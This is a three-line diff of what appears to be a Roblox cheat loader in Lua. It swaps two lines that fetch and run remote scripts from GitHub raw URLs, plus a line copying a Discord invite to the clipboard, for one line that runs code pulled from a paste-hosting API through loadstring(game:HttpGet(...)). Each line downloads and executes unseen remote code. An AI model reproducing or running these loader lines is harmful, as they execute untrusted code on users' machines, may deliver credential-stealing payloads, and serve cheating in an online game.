@@ -1,3 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/YNhiOnTop/YNhiScript/refs/heads/main/SABNEW"))()
-local a = loadstring(game:HttpGet("https://raw.githubusercontent.com/ZysumeDupePet/LuckyBlockMeow/refs/heads/main/Meow"))()
-setclipboard("https://discord.gg/xSAgQT3ah")
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/boi27xDJ7Hntezqs/raw"))()
